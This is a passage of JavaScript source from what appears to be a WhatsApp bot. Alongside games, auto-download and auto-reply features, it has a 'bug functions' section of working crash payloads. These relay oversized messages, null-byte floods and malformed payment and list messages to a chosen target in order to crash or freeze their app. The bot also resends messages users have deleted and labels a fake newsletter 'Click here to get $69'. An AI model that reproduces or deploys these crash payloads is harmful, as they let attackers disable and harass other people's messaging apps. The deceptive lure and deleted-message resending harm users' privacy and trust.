			XeonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        //auto download #ctto
        if (db.settings[botNumber].autodownload && !m.key.fromMe) {
try {
if (budy.match(`instagram.com`)) {
await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
		
		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !XeonTheCreator) {
				return
			}
			
			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
					await XeonBotInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
		}
		
		//user db //friend
        if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./src/user.json', JSON.stringify(xeonverifieduser, null, 2))
}
		
		// Check Expiry
		prem.expiredCheck(XeonBotInc, premium);
		
		// TicTacToe
		let room = Object.values(game.tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				replygcxeon({
					'-3': 'The game is over',
					'-2': 'Invalid',
					'-1': 'Invalid Position',
					0: 'Invalid Position',
				}[ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				}[v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				global.db.users[m.sender].limit += 3
				global.db.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await XeonBotInc.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m })
			await XeonBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
			if (isTie || isWin) {
				delete game.tictactoe[room.id]
			}
		}
		
		// Suit PvP
		let roof = Object.values(game.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
					replygcxeon(`@${roof.p2.split`@`[0]} rejected the suit,\nsuit cancelled`)
					delete game.suit[roof.id]
					return !0
				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				replygcxeon(`The suit has been sent to chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nPlease select a suit in the respective chat https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) XeonBotInc.sendMessage(roof.p, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				if (!roof.pilih2) XeonBotInc.sendMessage(roof.p2, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) replygcxeon(`Both players have no intention of playing,\nSuit cancelled`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						replygcxeon(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`)
					}
					delete game.suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /scissors/i
			let b = /rock/i
			let k = /paper/i
			let reg = /^(scissors|rock|paper)/i;
			
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				replygcxeon(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`);
				if (!roof.pilih2) XeonBotInc.sendMessage(roof.p2, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				replygcxeon(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
				if (!roof.pilih) XeonBotInc.sendMessage(roof.p, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				global.db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				global.db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				XeonBotInc.sendMessage(roof.asal, { text: `_*Suit Results*_${tie ? '\nSERIES' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}\n\nWinner Gets\n*Present :* Money(3000) & Limit(3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: m })
				delete game.suit[roof.id]
			}
		}
		
		// Guess Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in game.tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				game.tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				game.tebakbom[m.sender].pick++;
				XeonBotInc.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				game.tebakbom[m.sender].bomb--;
				game.tebakbom[m.sender].nyawa.pop();
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].nyawa.length < 1) {
					global.db.users[m.sender].limit -= 1
					await replygcxeon(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
					XeonBotInc.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete game.tebakbom[m.sender];
				} else await replygcxeon(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				game.tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				game.tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				game.tebakbom[m.sender].pick++;
				game.tebakbom[m.sender].lolos--;
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].lolos < 1) {
					global.db.users[m.sender].limit += 3
					global.db.users[m.sender].uang += 3000
					await replygcxeon(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
					delete game.tebakbom[m.sender];
				} else replygcxeon(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
			}
		}
		
		// Math
		if (game.kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = game.kuismath[m.sender.split('@')[0]].jawaban
			const difficultyMap = { 'noob': 1, 'easy': 2, 'medium': 3, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
			let hasilLimit = difficultyMap[game.kuismath[m.sender.split('@')[0]].mode]
			if (isNaN(budy)) return
			if (budy.toLowerCase() == jawaban) {
				global.db.users[m.sender].limit += hasilLimit
				global.db.users[m.sender].uang += hasilLimit * 1000
				await replygcxeon(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\nYou Get a Limit *${hasilLimit}*\n\nWant to play again? Send ${prefix}math mode`)
				delete game.kuismath[m.sender.split('@')[0]]
			} else replygcxeon('*Wrong answer!*')
		}
		
		// Menfes
		if (!m.isGroup) {
			if (game.menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await XeonBotInc.relayMessage(game.menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		
		// Afk
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = global.db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			replygcxeon(`Don't tag him!\nHe's AFK ${reason ? 'with reason ' + reason : 'no reason'}\nDuring ${clockString(new Date - afkTime)}`.trim())
		}
		if (global.db.users[m.sender].afkTime > -1) {
			let user = global.db.users[m.sender]
			replygcxeon(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' after ' + user.afkReason : ''}\nDuring ${clockString(new Date - user.afkTime)}`)
			user.afkTime = -1
			user.afkReason = ''
		}
		
		//reply
        async function replygcxeon(teks) {
            if (typereply === 'v1') {
                replygcxeon(teks)
            } else if (typereply === 'v2') {
                XeonBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               XeonBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'v4') {
                replygcxeon2(teks)
            }
        }
        
//fake reply with channel link embedded
async function replygcxeon2(txt) {
const xeonnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Click here to get $69",
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.ibb.co/cvXxmHC/cheemspic.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return XeonBotInc.sendMessage(m.chat, xeonnewrep, {
quoted: m,
})
}

//theme sticker reply
        const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        XeonBotInc.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        
//time
const xday = moment.tz('Asia/Kolkata').locale('en-IN').format('dddd');
const xdate = moment.tz('Asia/Kolkata').locale('en-IN').format('DD/MM/YYYY');
const xtime = moment().tz('Asia/Kolkata').locale('en-IN').format('HH:mm:ss');
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 

//theme txt
let setv = pickRandom(global.listv)

//autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
XeonBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: XeonBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XeonBotInc.ev.emit('messages.upsert', msg)
} 

//======bug functions========\\
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}

const sendReaction = async reactionContent => {
  XeonBotInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   XeonBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    XeonBotInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
